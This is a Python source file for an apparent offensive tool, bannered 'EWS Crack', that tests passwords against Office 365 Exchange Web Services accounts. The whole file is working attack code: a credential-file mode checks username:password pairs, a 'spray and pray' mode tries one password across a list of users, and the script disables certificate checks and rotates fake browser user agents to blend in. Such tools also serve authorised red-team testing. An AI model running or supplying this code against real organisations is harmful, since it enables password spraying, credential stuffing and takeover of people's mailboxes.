"""

Mike Siegel @ml_siegel 
--
MIT License

Copyright (c) [year] [fullname]

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

"""


import click
from exchangelib import Account, Credentials, Configuration, DELEGATE
from exchangelib.errors import UnauthorizedError, CASError
import random
# Comment this out to validate certs
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
import requests.utils
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter


def _new_user_agent(name=False):
    ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36'
          'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7']
    return random.choice(ua)


requests.utils.default_user_agent = _new_user_agent


def ews_config_setup(user, password, domain):

    try:
        config = Configuration(
            server='outlook.office365.com',
            credentials=Credentials(
                username="{}@{}".format(user, domain),
                password=password))

        account = Account(
            primary_smtp_address="{}@{}".format(user, domain),
            autodiscover=False,
            config=config,
            access_type=DELEGATE)

    except UnauthorizedError:
        print("Bad password")
        return None, None

    except CASError:
        print("CAS Error: User {} does not exist.".format(user))
        return None, None

    return account, config


def test_single_mode(domain, username, password):
    account, config = ews_config_setup(username, password, domain)
    if account is None and config is None:
        return False

    next(iter(account.inbox.all()))
    return True


def multi_account_test(domain, filename):

    with open(filename) as credentials:
        for line in credentials:
            username, password = line.split(":")
            valid = test_single_mode(domain, username, password)
            if valid:
                print("Valid combo found {}:{}".format(username, password))


def spray_and_pray(domain, filename, password):
    with open(filename) as userlist:
        for user in userlist:
            valid = test_single_mode(domain, user.rstrip(), password)
            if valid:
                print("Valid combo found {}:{}".format(user.rstrip(), password))


@click.command()
@click.option('--mode', type=click.Choice(['spray', 'single', 'creds']))
@click.option('--filename')
@click.option('--domain')
@click.option('--username')
@click.option('--password')
def main(mode, domain, username=None, password=None, filename=None):

    leetsauce = """
  ____|  \ \        /    ___|        ___|                         |    
  __|     \ \  \   /   \___ \       |        __|    _` |    __|   |  / 
  |        \ \  \ /          |      |       |      (   |   (        <  
 _____|     \_/\_/     _____/      \____|  _|     \__,_|  \___|  _|\_\ 
"""

    banner = "============================================================================="
    print(banner)
    print(leetsauce)
    print(banner)

    if mode == 'single':
        print("Single account mode selected")
        valid = test_single_mode(domain, username, password)
        print("Valid password" if valid else "Invalid password")

    if mode == 'creds':
        print("Credential file testing selected")
        multi_account_test(domain, filename)

    if mode == 'spray':
        print("Spray and pray mode")
        spray_and_pray(domain, filename, password)


if __name__ == "__main__":
    main()
